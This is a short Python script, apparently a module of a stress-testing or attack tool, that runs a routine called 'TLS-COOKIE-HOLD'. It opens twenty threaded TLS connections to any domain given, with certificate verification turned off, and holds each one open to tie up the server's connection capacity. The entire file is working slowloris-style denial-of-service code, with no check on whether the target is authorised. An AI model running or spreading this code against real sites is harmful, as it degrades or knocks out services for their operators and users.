import socket
import ssl
import time
import threading

NUM_CONNECTIONS = 20
HOLD_DURATION = 30  # seconds

def hold_tls_connection(domain):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    try:
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                time.sleep(HOLD_DURATION)  # Hold the connection open
    except Exception as e:
        print(f"[!] TLS error: {e}")

def run_tls_cookie_hold(domain):
    print(f"[+] Running TLS-COOKIE-HOLD on {domain}")
    threads = []
    for _ in range(NUM_CONNECTIONS):
        t = threading.Thread(target=hold_tls_connection, args=(domain,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print(f"[✓] TLS-COOKIE-HOLD complete")
